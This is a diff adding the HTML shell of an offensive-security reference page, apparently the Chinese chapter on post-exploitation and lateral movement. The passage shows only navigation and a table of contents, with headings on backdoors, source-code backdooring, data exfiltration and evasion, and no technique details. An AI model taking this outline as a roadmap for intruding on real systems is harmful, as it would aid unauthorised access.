@@ -1,0 +1,3034 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Full-stack offensive security reference — anti-attribution, reconnaissance, AD attacks, C2 development, AV/EDR evasion, cloud-native and AI-powered attacks, updated with 2025-2026 APT techniques.">
+      
+      
+      
+        <link rel="canonical" href="https://lupingqaq.github.io/red-team-skill-tree/zh-CN/ch-05/">
+      
+      
+        <link rel="prev" href="../ch-04/">
+      
+      
+        <link rel="next" href="../ch-06/">
+      
+      
+        
+          <link rel="alternate" href="/red-team-skill-tree/" hreflang="en">
+        
+          <link rel="alternate" href="/red-team-skill-tree/zh-CN/" hreflang="zh">
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>5. 后渗透与内网横向 - Red Team Skill Tree</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#5" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Red Team Skill Tree" class="md-header__button md-logo" aria-label="Red Team Skill Tree" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Red Team Skill Tree
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              5. 后渗透与内网横向
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+      <div class="md-header__option">
+  <div class="md-select">
+    
+    <button class="md-header__button md-icon" aria-label="Select language">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12.87 15.07-2.54-2.51.03-.03A17.5 17.5 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2zm-2.62 7 1.62-4.33L19.12 17z"/></svg>
+    </button>
+    <div class="md-select__inner">
+      <ul class="md-select__list">
+        
+          <li class="md-select__item">
+            <a href="/red-team-skill-tree/" hreflang="en" class="md-select__link">
+              English
+            </a>
+          </li>
+        
+          <li class="md-select__item">
+            <a href="/red-team-skill-tree/zh-CN/" hreflang="zh" class="md-select__link">
+              简体中文
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/lupingQAQ/red-team-skill-tree" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    lupingQAQ/red-team-skill-tree
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Red Team Skill Tree" class="md-nav__button md-logo" aria-label="Red Team Skill Tree" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Red Team Skill Tree
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/lupingQAQ/red-team-skill-tree" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    lupingQAQ/red-team-skill-tree
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1. Anti-Attribution and Anonymization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2. Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-03/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3. Penetration Testing in Practice
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-04/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4. Code Audit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-05/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5. Post-Exploitation and Internal Network Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-06/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6. Server and Personal PC Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-07/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7. Phishing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-08/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8. RAT/C2 Tool Development
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-09/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9. Trojan AV/EDR Evasion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10. Evidence Image System Restore (Linux)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-11/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    11. Practical Wordlists and Toolkits
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-12/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    12. AI-Powered Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-13/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    13. Cloud-Native Attack and Defense
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-14/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    14. Modern C2 Evolution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-15/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    15. Advanced Evasion Techniques
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-16/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    16. Latest AD/Infrastructure Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-17/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    17. Initial Access Evolution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-18/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    18. Cloud Post-Exploitation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-19/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    19. HVV / Red-vs-Blue Practical Topics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-20/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    20. Zero Trust Environment Bypass
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-21/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    21. OT/ICS Industrial Control Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-22/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    22. Mobile Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-23/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    23. Living off the Land (LotL) Attack Chains
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-24/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    24. Outdated Content Warnings and Alternatives
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../appendix/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Appendix — Raw Outline
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_27" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_27" id="__nav_27_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    简体中文
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_27_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_27">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    简体中文
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1. 反溯源与匿名化
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2. 信息收集
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-03/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3. 渗透实战
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-04/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4. 代码审计
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5. 后渗透与内网横向
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5. 后渗透与内网横向
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#51" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1 域渗透提权
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#52" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2 服务器提权
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#53-rpc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.3 RPC域内信息收集与横向移动
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.3 RPC域内信息收集与横向移动">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        横向移动工具
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        信息收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rpc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RPC工具
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#54" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.4 域内凭证及口令收集
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#55" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.5 权限维持
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.5 权限维持">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows后门
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Linux后门
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        修改源码插入后门
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#56" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.6 内网核心设备攻防
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.6 内网核心设备攻防">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NAS攻击
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        邮服攻击
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        堡垒机攻击
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vcenter" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        vCenter攻击
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vdi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VDI云桌面攻击
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vpn" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VPN设备攻击
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#57" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.7 非域内网渗透
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.7 非域内网渗透">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        入口方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#linux-getshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Linux getshell后操作
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows信息收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        数据外传
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        横向移动
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        找域
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tv" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TV/向日葵
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-06/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6. 服务器及个人PC信息收集
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-07/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7. 钓鱼
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
